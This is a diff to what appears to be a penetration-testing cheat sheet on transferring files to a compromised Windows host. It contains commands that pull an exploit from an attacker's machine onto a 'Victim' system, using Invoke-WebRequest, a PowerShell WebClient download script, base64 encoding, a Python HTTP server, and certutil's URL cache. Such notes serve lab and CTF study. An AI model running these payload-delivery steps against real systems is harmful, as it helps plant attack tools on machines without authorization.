@@ -58,18 +58,25 @@ Using MSF. Start MSF before starting these steps:
 
 	1. Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
 	
+	Without an interactive powershell session:
+	
+	1. Create wget.ps1
+	   $client = New-Object System.Net.WebClient
+	   $client.DownloadFile($url, $path)
+	
 #Base64
 
 	local system:
-	1. cat exploit.py |base64
+	1. cat exploit.py | base64
 	
 	victim:
 	2. echo "base64string==" | base64 -d >> exploit.py
 	
 #Certutil
 		
-	local system:
+	local system (either python2/3):
 	1. python -m SimpleHTTPServer 80
+	1b. python3 -m http.server 80
 	
 	victim:
 	2. certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
